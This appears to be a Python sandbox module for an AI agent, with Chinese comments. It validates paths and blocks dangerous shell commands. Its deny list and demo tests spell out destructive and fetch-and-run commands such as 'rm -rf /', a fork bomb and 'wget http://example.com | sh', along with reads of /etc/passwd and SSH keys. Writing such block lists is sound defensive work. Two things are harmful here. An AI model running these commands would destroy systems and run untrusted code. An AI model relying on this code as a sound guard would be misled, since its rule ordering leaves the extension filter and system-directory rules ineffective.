#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PathRule 权限沙箱模块

OpenHarness 核心移植 - path_validator.py 增强版
文件读写、命令执行、代码操作做白名单校验
杜绝 agent 乱删文件、跨路径乱操作
统一所有工具调用前置校验

作者：AI Agent (移植 OpenHarness)
日期：2026-04-14
"""

from pathlib import Path
from typing import Tuple, List, Optional, Set, Dict
from dataclasses import dataclass
from enum import Enum
import os
import re


class PermissionLevel(Enum):
    """权限级别"""
    READ_ONLY = "read_only"  # 只读
    READ_WRITE = "read_write"  # 读写
    EXECUTE = "execute"  # 可执行
    FULL_ACCESS = "full_access"  # 完全访问


@dataclass
class PathRule:
    """路径规则"""
    pattern: str  # 路径模式 (支持通配符)
    permission: PermissionLevel  # 权限级别
    description: str = ""
    allowed_extensions: Optional[List[str]] = None  # 允许的文件扩展名
    denied_extensions: Optional[List[str]] = None  # 禁止的文件扩展名


class PathRuleValidator:
    """
    路径规则验证器
    
    核心能力：
    1. 白名单路径校验
    2. 扩展名过滤
    3. 危险操作拦截
    """
    
    def __init__(self, workspace_root: str = "/root/.openclaw/workspace"):
        self.workspace_root = Path(workspace_root).resolve()
        self.rules: List[PathRule] = []
        self._init_default_rules()
    
    def _init_default_rules(self):
        """初始化默认规则"""
        # 工作区完全访问
        self.add_rule(PathRule(
            pattern=str(self.workspace_root),
            permission=PermissionLevel.FULL_ACCESS,
            description="工作区完全访问",
        ))
        
        # 系统关键目录禁止访问
        self.add_rule(PathRule(
            pattern="/etc",
            permission=PermissionLevel.READ_ONLY,
            description="系统配置目录只读",
        ))
        
        self.add_rule(PathRule(
            pattern="/root/.ssh",
            permission=PermissionLevel.READ_ONLY,
            description="SSH 目录只读",
        ))
        
        self.add_rule(PathRule(
            pattern="/proc",
            permission=PermissionLevel.READ_ONLY,
            description="进程目录只读",
        ))
        
        # 危险扩展名禁止写入
        self.add_rule(PathRule(
            pattern=str(self.workspace_root),
            permission=PermissionLevel.READ_WRITE,
            description="工作区读写但禁止危险文件",
            denied_extensions=[".exe", ".dll", ".so", ".sh", ".bat"],
        ))
    
    def add_rule(self, rule: PathRule):
        """添加规则"""
        self.rules.append(rule)
    
    def validate_path(
        self,
        path: str,
        operation: str = "read",
    ) -> Tuple[bool, str]:
        """
        验证路径操作是否允许
        
        Args:
            path: 要操作的路径
            operation: 操作类型 (read/write/execute/delete)
        
        Returns:
            (是否允许，原因)
        """
        target_path = Path(path).resolve()
        
        # 1. 检查是否在工作区内
        try:
            target_path.relative_to(self.workspace_root)
            # 在工作区内，继续检查规则
        except ValueError:
            # 不在工作区内，检查是否有特殊规则允许
            allowed, reason = self._check_special_rules(target_path, operation)
            if not allowed:
                return False, f"路径 {target_path} 不在工作区 {self.workspace_root} 内"
            return allowed, reason
        
        # 2. 检查路径规则
        for rule in self.rules:
            if self._match_pattern(target_path, rule.pattern):
                # 检查权限级别
                if not self._check_permission(rule.permission, operation):
                    return False, f"权限不足：{operation} 操作需要 {rule.permission.value} 级别"
                
                # 检查扩展名
                if rule.denied_extensions:
                    ext = target_path.suffix.lower()
                    if ext in rule.denied_extensions:
                        return False, f"禁止的文件类型：{ext}"
                
                if rule.allowed_extensions:
                    ext = target_path.suffix.lower()
                    if ext not in rule.allowed_extensions:
                        return False, f"不允许的文件类型：{ext}，允许：{rule.allowed_extensions}"
                
                return True, ""
        
        # 默认允许工作区内操作
        return True, ""
    
    def _check_special_rules(
        self,
        path: Path,
        operation: str,
    ) -> Tuple[bool, str]:
        """检查特殊规则"""
        # 允许读取 /tmp
        if str(path).startswith("/tmp") and operation == "read":
            return True, ""
        
        # 允许读取 /root/.openclaw
        if str(path).startswith("/root/.openclaw") and operation == "read":
            return True, ""
        
        return False, ""
    
    def _match_pattern(self, path: Path, pattern: str) -> bool:
        """匹配路径模式"""
        path_str = str(path)
        
        # 精确匹配
        if path_str == pattern:
            return True
        
        # 前缀匹配 (目录)
        if path_str.startswith(pattern + "/"):
            return True
        
        # 通配符匹配
        if "*" in pattern or "?" in pattern:
            regex_pattern = pattern.replace("*", ".*").replace("?", ".")
            if re.match(regex_pattern, path_str):
                return True
        
        return False
    
    def _check_permission(
        self,
        level: PermissionLevel,
        operation: str,
    ) -> bool:
        """检查权限"""
        if level == PermissionLevel.FULL_ACCESS:
            return True
        
        if operation == "read":
            return level in [
                PermissionLevel.READ_ONLY,
                PermissionLevel.READ_WRITE,
                PermissionLevel.FULL_ACCESS,
            ]
        
        if operation == "write":
            return level in [
                PermissionLevel.READ_WRITE,
                PermissionLevel.FULL_ACCESS,
            ]
        
        if operation == "execute":
            return level in [
                PermissionLevel.EXECUTE,
                PermissionLevel.FULL_ACCESS,
            ]
        
        if operation == "delete":
            return level == PermissionLevel.FULL_ACCESS
        
        return False
    
    def validate_command(self, command: str) -> Tuple[bool, str]:
        """
        验证命令是否安全
        
        拦截危险命令
        """
        dangerous_patterns = [
            "rm -rf /",
            "rm -rf /*",
            "dd if=/dev/zero",
            ":(){:|:&};:",
            "mkfs",
            "fdisk",
            "chmod 777 /",
            "chown -R",
            "wget.*\\|.*sh",
            "curl.*\\|.*sh",
            "sudo.*rm",
            "sudo.*chmod",
            "sudo.*chown",
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, command, re.IGNORECASE):
                return False, f"危险命令被拦截：{pattern}"
        
        return True, ""
    
    def validate_file_operation(
        self,
        source: str,
        target: str,
        operation: str = "copy",
    ) -> Tuple[bool, str]:
        """
        验证文件操作
        
        Args:
            source: 源路径
            target: 目标路径
            operation: 操作类型 (copy/move/delete)
        """
        # 验证源路径
        allowed, reason = self.validate_path(source, "read")
        if not allowed:
            return False, f"源路径不允许：{reason}"
        
        # 验证目标路径
        allowed, reason = self.validate_path(target, "write")
        if not allowed:
            return False, f"目标路径不允许：{reason}"
        
        return True, ""


class SandboxInterceptor:
    """
    沙箱拦截器
    
    在所有工具调用前进行拦截校验
    """
    
    def __init__(self, validator: PathRuleValidator = None):
        self.validator = validator or PathRuleValidator()
        self.intercept_log: List[Dict] = []
    
    def intercept(
        self,
        tool_name: str,
        tool_input: Dict,
    ) -> Tuple[bool, str]:
        """
        拦截工具调用
        
        Args:
            tool_name: 工具名称
            tool_input: 工具输入参数
        
        Returns:
            (是否允许，原因)
        """
        from datetime import datetime
        
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "tool_name": tool_name,
            "tool_input": tool_input,
            "allowed": True,
            "reason": "",
        }
        
        # 根据工具类型进行校验
        if tool_name in ["read", "edit", "write"]:
            path = tool_input.get("path", "")
            if path:
                allowed, reason = self.validator.validate_path(path, "read" if tool_name == "read" else "write")
                if not allowed:
                    log_entry["allowed"] = False
                    log_entry["reason"] = reason
                    self.intercept_log.append(log_entry)
                    return False, reason
        
        elif tool_name == "bash":
            command = tool_input.get("command", "")
            if command:
                allowed, reason = self.validator.validate_command(command)
                if not allowed:
                    log_entry["allowed"] = False
                    log_entry["reason"] = reason
                    self.intercept_log.append(log_entry)
                    return False, reason
        
        elif tool_name in ["glob", "grep"]:
            pattern = tool_input.get("pattern", "")
            # 可以添加 pattern 校验逻辑
        
        # 允许通过
        self.intercept_log.append(log_entry)
        return True, ""
    
    def get_intercept_log(self, limit: int = 50) -> List[Dict]:
        """获取拦截日志"""
        return self.intercept_log[-limit:]


# ==================== 使用示例 ====================

if __name__ == "__main__":
    # 创建验证器
    validator = PathRuleValidator()
    
    # 测试路径验证
    test_paths = [
        ("/root/.openclaw/workspace/test.py", "read"),
        ("/root/.openclaw/workspace/test.py", "write"),
        ("/etc/passwd", "read"),
        ("/root/.ssh/id_rsa", "read"),
        ("/tmp/test.txt", "read"),
    ]
    
    print("🔒 路径验证测试：")
    for path, op in test_paths:
        allowed, reason = validator.validate_path(path, op)
        status = "✅" if allowed else "❌"
        print(f"  {status} {op} {path}: {reason or '允许'}")
    
    # 测试命令验证
    test_commands = [
        "ls -la",
        "cat test.py",
        "rm -rf /",
        "wget http://example.com | sh",
    ]
    
    print("\n🔒 命令验证测试：")
    for cmd in test_commands:
        allowed, reason = validator.validate_command(cmd)
        status = "✅" if allowed else "❌"
        print(f"  {status} {cmd}: {reason or '允许'}")
    
    # 测试拦截器
    print("\n🔒 拦截器测试：")
    interceptor = SandboxInterceptor(validator)
    
    test_tools = [
        ("read", {"path": "/root/.openclaw/workspace/test.py"}),
        ("write", {"path": "/etc/passwd", "content": "test"}),
        ("bash", {"command": "ls -la"}),
        ("bash", {"command": "rm -rf /"}),
    ]
    
    for tool_name, tool_input in test_tools:
        allowed, reason = interceptor.intercept(tool_name, tool_input)
        status = "✅" if allowed else "❌"
        print(f"  {status} {tool_name}: {reason or '允许'}")
    
    print(f"\n📊 拦截日志：{len(interceptor.get_intercept_log())} 条")
